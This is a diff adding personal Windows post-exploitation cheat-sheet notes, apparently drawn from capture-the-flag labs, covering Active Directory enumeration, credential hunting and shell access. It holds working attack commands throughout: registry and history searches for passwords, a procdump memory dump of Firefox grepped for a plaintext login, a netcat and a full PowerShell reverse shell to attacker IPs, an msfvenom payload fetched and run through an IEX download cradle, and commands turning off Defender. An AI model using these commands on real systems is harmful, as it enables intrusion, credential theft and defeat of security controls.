@@ -1,0 +1,296 @@
+Some random commands : 
+
+```jsx
+$env:USERDNSDOMAIN (get domain name)
+PS : Get-ChildItem Env: (List all environment variables)
+$env:PATH (inpect system path PS)
+echo %PATH% (inpect system path cmd)
+```
+
+Enumerate local accounts : 
+
+```jsx
+net user /domain
+```
+
+Enumerate certain users  : 
+
+```jsx
+net user jeffadmin /domain
+```
+
+Enumerate local groups : 
+
+```jsx
+net group /domain
+net localgroup administrators
+```
+
+Enumerate members of a group : 
+
+```jsx
+net group "Sales Department" /domain
+net localgroup administrators
+```
+
+List hidden files : 
+
+```jsx
+cmd : dir /a
+PS : dir -Force
+```
+
+List a directory like tree : 
+
+```jsx
+tree /f .
+```
+
+When AD Recycle Bin is enabled, check AD Recyclebin to seek deleted objects (Tombwatcher): 
+
+```jsx
+*Evil-WinRM* PS C:\Users\svc_winrm\Desktop> Get-ADOptionalFeature 'Recycle Bin Feature'
+
+DistinguishedName  : CN=Recycle Bin Feature,CN=Optional Features,CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=voleur,DC=htb
+EnabledScopes      : {CN=Partitions,CN=Configuration,DC=voleur,DC=htb, CN=NTDS Settings,CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=voleur,DC=htb}
+FeatureGUID        : 766ddcd8-acd0-445e-f3b9-a7f9b6744f2a
+FeatureScope       : {ForestOrConfigurationSet}
+IsDisableable      : False
+Name               : Recycle Bin Feature
+ObjectClass        : msDS-OptionalFeature
+ObjectGUID         : ba06e572-1681-46f7-84d2-e08b001f5c51
+RequiredDomainMode :
+RequiredForestMode : Windows2008R2Forest
+
+```
+
+Check for any deleted accounts : 
+
+```jsx
+Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects -property objectSid,lastKnownParent
+```
+
+Restore it using the ObjectGUID : 
+
+```jsx
+Restore-ADObject -Identity 1c6b1deb-c372-4cbb-87b1-15031de169db
+```
+
+Check if it ran succesful : 
+
+```jsx
+Get-ADUser &nameofuser
+```
+
+Run cmd in Powershell : 
+
+```jsx
+cmd \c 'command'
+```
+
+Fast important file search : 
+
+```jsx
+PS : Get-ChildItem -Path C:\Users\ -Include *.kdbx,*.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.rar,*.zip,*.7z,*.config,*.xml,*.ini,*.ps1,*.bat,*.kirbi,*.rdp -File -Recurse -ErrorAction SilentlyContinue | Select-Object FullName, Length, LastWriteTime
+Cmd : dir C:\Users\*.kdbx C:\Users\*.txt C:\Users\*.pdf C:\Users\*.xls C:\Users\*.xlsx C:\Users\*.doc C:\Users\*.docx C:\Users\*.rar C:\Users\*.zip C:\Users\*.7z C:\Users\*.config C:\Users\*.xml C:\Users\*.ini C:\Users\*.ps1 /s /b 2>nul
+```
+
+Find Search for hidden files, search for anything from C drive that is named .git : 
+
+```jsx
+cmd : dir /s /b /ad C:\.git
+powershell : cmd /c "dir /s /b /ad C:\.git"
+powershell : cmd /c "dir /s /b /ad C:\*.ssh*"
+```
+
+When you see a windows.old directory, find the sam, system to crack.
+
+```jsx
+C:\windows.old\Windows\system32
+```
+
+Windows version enumeration : 
+
+```jsx
+Get-ComputerInfo | Select-Object WindowsProductName, WindowsVersion, OsHardwareAbstractionLayer
+```
+
+Find PS history path : 
+
+```jsx
+(Get-PSReadlineOption).HistorySavePath
+=> Get-Content (Get-PSReadlineOption).HistorySavePath
+```
+
+Get Powershell command history for all users:
+
+```jsx
+Get-Content "C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
+PS : Get-Content -Path "C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\*.txt" -ErrorAction SilentlyContinue
+CMD : type C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\*.txt
+```
+
+```jsx
+type C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+type C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ServerRemoteHost_history.txt
+```
+
+Check running ports : 
+
+```jsx
+netstat -ano
+netstat -ano | findstr LISTENING
+=> Check Process name from PID : Get-Process -Id <PID>
+
+0.0.0.0 (Can be connected by all interfaces)
+127.0.0.1 (Can only be connected by localhost)
+
+netstat -o (to check running services)
+tasklist  | findstr PID (reverse lookup)
+```
+
+Inetpub is the default folder for IIS web so look in there if you are stuck 
+
+Check browser (Heist HTB) 
+
+```jsx
+*Evil-WinRM* PS C:\> get-process firefox
+Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
+-------  ------    -----      -----     ------  bl   --  -- -----------
+    358      26    16332     279920       0.73   6252   1 firefox
+   1138      71   141448     476008      42.98   6440   1 firefox
+    341      19    10176     264104       0.80   6564   1 firefox
+    407      31    17392     293212       3.86   6796   1 firefox
+    390      36    78456     341504      67.70   7104   1 firefox   
+```
+
+Then getcreds from procdump : 
+
+```jsx
+*Evil-WinRM* PS C:\Users\Chase\Documents> .\procdump64 -ma 6252 -accepteula
+
+ProcDump v9.0 - Sysinternals process dump utility
+Copyright (C) 2009-2017 Mark Russinovich and Andrew Richards
+Sysinternals - www.sysinternals.com
+
+[02:54:30] Dump 1 initiated: C:\Users\Chase\Documents\firefox.exe_190823_025430.dmp
+[02:54:30] Dump 1 writing: Estimated dump file size is 280 MB.
+[02:54:32] Dump 1 complete: 281 MB written in 2.1 seconds
+[02:54:33] Dump count reached.
+```
+
+Then you can dump the firefox dump and grep the password based on the POST Login.
+
+```jsx
+root@kali# grep -aoE 'login_username=.{1,20}@.{1,20}&login_password=.{1,50}&login=' firefox.exe_190823_025430.dmp 
+login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
+login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
+login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
+```
+
+Check file permission (F : Full Control)  : 
+
+```jsx
+daniel@MARKUP C:\Log-Management>icacls job.bat
+job.bat BUILTIN\Users:(F)
+        NT AUTHORITY\SYSTEM:(I)(F)
+        BUILTIN\Administrators:(I)(F)
+        BUILTIN\Users:(I)(RX)
+
+Successfully processed 1 files; Failed processing 0 files
+```
+
+```jsx
+icacls C:\Log-Management
+```
+
+Should check the program files folder in Disk C when you are stuck, List installed applications.
+
+Check Credentials in Registry, Upon execution, any registry key containing the word "password" will be displayed. : 
+
+```jsx
+https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1552.002/T1552.002.md
+```
+
+```jsx
+reg query HKCU /f password /t REG_SZ /s
+reg query HKLM /f password /t REG_SZ /s
+reg query HKLM /f passwd /t REG_SZ /s
+reg query HKLM /f pwd /t REG_SZ /s
+reg query HKLM /f secret /t REG_SZ /s
+reg query HKLM /f credential /t REG_SZ /s
+reg query HKCU /f password /t REG_SZ /s
+reg query HKCU /f passwd /t REG_SZ /s
+reg query HKCU /f pwd /t REG_SZ /s
+```
+
+```jsx
+REM Autologon credentials (siêu phổ biến, thường gặp nhất)
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
+
+REM VNC password (lưu dạng encrypted nhưng decode được)
+reg query "HKCU\Software\ORL\WinVNC3\Password"
+reg query "HKLM\SOFTWARE\RealVNC\WinVNC4" /v Password
+
+REM PuTTY saved sessions (đôi khi có saved password trong proxy auth)
+reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
+
+REM SNMP community string
+reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP\Parameters\ValidCommunities"
+```
+
+Enumeration for PuTTY Credentials in Registry if Putty is installed: 
+
+```jsx
+reg query HKCU\Software\SimonTatham\PuTTY\Sessions /t REG_SZ /s
+```
+
+Powershell restriction bypass : 
+
+```jsx
+powershell -ep bypass
+```
+
+Upgrade shell cheetsheet : 
+
+```jsx
+https://www.crow.rip/tools/cheatsheet/#shell-upgrade
+```
+
+Netcat reverse shell for windows : 
+
+```jsx
+nc.exe -e cmd.exe 10.10.14.2 1234
+```
+
+Windows reverse shell : 
+
+```jsx
+echo -n '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.219",4446);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbackByte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbackByte,0,$sendbackByte.Length);$stream.Flush()};$client.Close()' | iconv -t utf-16le | base64 -w 0
+```
+
+Send it in the web shell  reverse shell: 
+
+```jsx
+powershell -c "Start-Process cmd -ArgumentList '/c powershell -enc BASE64'"
+```
+
+```jsx
+powershell -enc BASE64
+```
+
+Reverse shell from msfvenom payload : 
+
+```jsx
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.219 LPORT=4444 -f psh -o shell.ps1
+powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://<YOUR_KALI_IP>/shell.ps1'')"
+```
+
+Disable Defender with powershell (only with local admin rights):
+
+```jsx
+Set-MpPreference -DisableRealtimeMonitoring $true
+Set-MpPreference -DisableIOAVProtection $true
+```
